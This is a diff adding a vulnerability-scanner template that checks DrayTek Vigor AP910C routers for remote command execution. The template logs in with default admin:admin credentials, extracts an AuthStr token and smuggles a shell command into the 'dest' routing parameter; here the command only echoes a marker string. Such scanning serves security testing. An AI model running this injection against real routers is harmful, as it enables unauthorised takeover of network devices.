@@ -1,0 +1,58 @@
+id: draytek-vigor-ap910c-rce
+info:
+  name: DrayTek Vigor AP910C Router Background Command Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    DrayTek Vigor AP910C is a wireless router product with firewall functionality. This template identifies a background RCE vulnerability allowing attackers to execute arbitrary commands.
+  reference:
+    - https://www.draytek.com/en/products/products-a-z/wireless-ap.all/vigorap-910c/
+  classification:
+    cvss-score: 7.5
+
+variables:
+  check_string: "{{rand_text_alpha(10)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: fetch-authstr
+    method: GET
+    path:
+      - "/opmode.asp"
+    headers:
+      Authorization: Basic YWRtaW46YWRtaW4=
+      Referer: {{BaseURL}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - '<input\\s+type="hidden"\\s+value=(\\w+)\\s+name="AuthStr">'
+    extractors:
+      - type: regex
+        name: auth_str
+        internal: true
+        regex:
+          - '<input\\s+type="hidden"\\s+value=(\\w+)\\s+name="AuthStr">'
+        group: 1
+
+  - id: verify-command-execution
+    method: GET
+    path:
+      - "/goform/addRouting?AuthStr={{auth_str}}&dest=||+echo+$(+echo+{{check_string}})+%3b%23a"
+    headers:
+      Authorization: Basic YWRtaW46YWRtaW4=
+      Referer: {{BaseURL}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{check_string}}"
+          - "Add routing failed"
